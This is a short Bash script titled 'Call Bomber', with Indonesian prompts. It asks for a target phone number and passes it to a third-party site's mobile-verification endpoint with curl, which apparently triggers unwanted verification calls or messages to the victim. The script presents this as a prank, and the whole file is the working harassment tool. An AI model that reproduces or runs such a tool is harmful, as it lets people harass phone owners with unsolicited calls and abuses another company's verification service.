#!bin/bash
clear

echo "{+}===================={+}"
echo "    Author: Danendra      "
echo "    Tools : Call Bomber   "
echo "{+}===================={+}"
figlet CallBomber  | lolcat
echo '
[1] Prank
[2] Exit Tools
     '

echo
read -p "masukan nomornya : " pil
if [[ $pil == 1 ]]; then
read -p "masukan no target : " nomor
link="https://id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
else
echo 'Terima Kasih Telah Menggunakan Tools Ini :)'
exit
fi
echo
